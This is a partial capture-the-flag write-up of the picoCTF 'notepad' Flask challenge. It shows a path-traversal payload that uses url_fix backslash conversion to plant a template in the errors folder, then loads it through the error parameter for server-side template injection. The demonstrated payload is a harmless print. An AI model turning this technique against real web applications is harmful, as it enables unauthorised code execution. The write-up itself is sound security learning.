Worked on this problem with the [Weekly Dev Chat](https://weeklydevchat.com/ensemble-hacking-on-picoctf-2025-01-28/).  We haven't solved the problem yet but we did figure out the following a couple things.

First, I couldn't get the Dockerfile to run.  I ran into the error:

```
ImportError: cannot import name 'url_fix' from 'werkzeug.urls' (/usr/local/lib/python3.9/site-packages/werkzeug/urls.py)
```

Adding `werkzueg` to the `pip install` line in the Dockerfile fixed that problem but then got:

```
ImportError: cannot import name 'soft_unicode' from 'markupsafe' (/usr/local/lib/python3.9/site-packages/markupsafe/__init__.py)
```

Then I gave up.

The ensemble session we first noticed that the [app.py](app.py) will create a html file with the name of the first 128 characters of the input.  Looks like it's vunerable to directory traversal:

```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

The problem is there is a check for the `/` in the code:

```python
if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
```

Then a WDC attendee looked up the `url_fix` and noticed that it will translate `\\` to `/`.  With that knowledge we can create the file wherever we wanted.  After some more poking around we noticed the [index.html](index.html) file will display errors:

```python
{% if error is not none %}
  <h3>
    error: {{ error }}
  </h3>
  {% include "errors/" + error + ".html" ignore missing %}
{% endif %}
```

The interesting thing was the `error` was just a argument we could manipulate in the url.  Combining the two issues we can create a file in the `errors/` folder and then display that file.  For example:

1) Enter a payload that creates the file in the `errors/` folder and has at least 128 characters before the Flask code:

```
..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

{% print('WDC') %}
```

2) This will create a url that will result in a 404:

```
https://notepad.mars.picoctf.net//templates//errors//aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-drnpaxSqRaw.html
```

3) Use the file name part of the url as the `?errors=` argument without the `.html` part:

```
https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-drnpaxSqRaw
```

4) It will show the contents of the page including any Flask code.  Notice the WDC at the end.

```
 error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-drnpaxSqRaw
..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa WDC 
```

We then tried to list the file contents using `{% os.listdir('.') %}` and various other combinations but that failed.  We ran out of time but I think the problem is Flask does not allow `os` calls in the views.  Not sure what the solution is for now but I'm sure we will figure it out eventually.